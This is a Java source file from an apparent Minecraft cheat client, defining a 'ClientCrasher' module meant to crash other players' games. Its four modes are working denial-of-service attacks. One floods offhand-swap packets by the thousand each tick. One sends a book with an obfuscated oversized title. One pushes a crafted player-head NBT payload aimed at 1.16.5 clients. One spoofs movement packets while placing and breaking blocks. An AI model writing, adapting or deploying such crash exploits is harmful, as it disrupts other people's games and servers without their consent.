/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.crash;

import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.item.BlockItem;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.Packet;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import net.shadow.client.feature.config.DoubleSetting;
import net.shadow.client.feature.config.EnumSetting;
import net.shadow.client.feature.gui.notifications.Notification;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;
import net.shadow.client.helper.event.EventListener;
import net.shadow.client.helper.event.EventType;
import net.shadow.client.helper.event.Events;
import net.shadow.client.helper.event.events.PacketEvent;

import java.util.List;
import java.util.Optional;
import java.util.Random;

public class ClientCrasher extends Module {

    final EnumSetting<Mode> mode = this.config.create(new EnumSetting.Builder<>(Mode.Offhand).name("Mode").description("How to crash").get());
    final DoubleSetting power = this.config.create(new DoubleSetting.Builder(1000).min(5).max(2000).name("Power").description("How much power to crash with").get());
    boolean sends = true;
    BlockPos selectedbreaker;

    public ClientCrasher() {
        super("ClientCrasher", "Crash players games", ModuleType.CRASH);
        Events.registerEventHandlerClass(this);
    }

    @EventListener(type = EventType.PACKET_SEND)
    void giveAShit(PacketEvent event) {
        if (mode.getValue() != Mode.Place) return;
        if (!sends) return;
        if (!this.isEnabled()) return;
        if (!(event.getPacket() instanceof PlayerMoveC2SPacket packet)) return;

        if (!(packet instanceof PlayerMoveC2SPacket.PositionAndOnGround || packet instanceof PlayerMoveC2SPacket.Full))
            return;

        if (client.player.input == null) {
            event.setCancelled(true);
            return;
        }

        event.setCancelled(false);
        double x = packet.getX(0);
        double y = packet.getY(0);
        double z = packet.getZ(0);

        Packet<?> newPacket;
        Random r = new Random();
        if (packet instanceof PlayerMoveC2SPacket.PositionAndOnGround)
            newPacket = new PlayerMoveC2SPacket.PositionAndOnGround(x, y + r.nextDouble(), z, true);
        else
            newPacket = new PlayerMoveC2SPacket.Full(x, y + r.nextDouble(), z, packet.getYaw(0), packet.getPitch(0), true);
        sends = false;
        client.player.networkHandler.getConnection().send(newPacket);
        sends = true;
    }

    @Override
    public void tick() {
        switch (mode.getValue()) {
            case Offhand -> {
                for (int i = 0; i < power.getValue(); i++) {
                    client.player.networkHandler.sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, client.player.getBlockPos(), Direction.UP));
                }
            }

            case Place -> {
                client.player.updatePosition(selectedbreaker.getX() + 0.5, selectedbreaker.getY() + 1, selectedbreaker.getZ() + 0.5);
                int b4slot = client.player.getInventory().selectedSlot;
                int slot = TheJ();
                if (slot == -1) return;
                if (client.player.world.getBlockState(selectedbreaker).isAir()) {
                    client.player.getInventory().selectedSlot = slot;
                    client.interactionManager.interactBlock(client.player, client.world, Hand.MAIN_HAND, new BlockHitResult(new Vec3d(selectedbreaker.getX(), selectedbreaker.getY(), selectedbreaker.getZ()).add(0.5, 0.5, 0.5), Direction.UP, selectedbreaker, false));
                    client.player.getInventory().selectedSlot = b4slot;
                    return;
                }
                client.getNetworkHandler().sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.STOP_DESTROY_BLOCK, selectedbreaker, Direction.UP));
                client.interactionManager.updateBlockBreakingProgress(selectedbreaker, Direction.UP);

            }

            case Lagbook -> {
                if (client.player.getInventory().getMainHandStack().getItem() != Items.WRITABLE_BOOK) {
                    Notification.create(1000, "Lagbook", Notification.Type.ERROR, "hold a book and quill in your main hand");
                    return;
                }
                String bigstring = "W".repeat(128);
                Optional<String> title = Optional.of("\u00a7k" + bigstring);
                List<String> pages = List.of("Very Cool Book");
                client.player.networkHandler.sendPacket(new BookUpdateC2SPacket(client.player.getInventory().selectedSlot, pages, title));
                Notification.create(1000, "Lagbook", Notification.Type.SUCCESS, "wrote book!");
                this.setEnabled(false);
            }

            case Poof -> {
                new Thread(() -> {
                    ItemStack stack = new ItemStack(Items.PLAYER_HEAD, 1);
                    Notification.create(1000, "Poof", Notification.Type.SUCCESS, "this only works on 1.16.5 players!");
                    try {
                        stack.setNbt(StringNbtReader.parse("{SkullOwner:{Id:[I;-11783291,-84552235,-74553283,-84863242],Properties:{textures:[{Value:\"eyJ0ZXh0dXJlcyI6eyJTS0lOIjp7InVybCI6Imh0dHBzOi8vZWR1Y2F0aW9uLm1pbmVjcmFmdC5uZXQvd3AtY29udGVudC91cGxvYWRzLzFweC5wbmcifX19\"}]},Name:\"Poof\"},display:{Name:'{\"text\":\"Poof\"}'}}"));
                    } catch (Exception ignored) {
                    }
                    client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(5, stack));
                    try {
                        Thread.sleep(500);
                    } catch (Exception ignored) {
                    }
                    ItemStack LITERALAIR = new ItemStack(Items.AIR, 1);
                    client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(5, LITERALAIR));
                }).start();
                this.setEnabled(false);
            }
        }
    }

    private int TheJ() {
        for (int i = 0; i < 9; i++) {
            ItemStack stack = client.player.getInventory().getStack(i);
            if (stack.isEmpty() || !(stack.getItem() instanceof BlockItem)) continue;

            return i;
        }
        return -1;
    }

    @Override
    public void enable() {
        this.selectedbreaker = client.player.getBlockPos();
    }

    @Override
    public void disable() {
    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }

    public enum Mode {
        Place, Offhand, Lagbook, Poof
    }
}
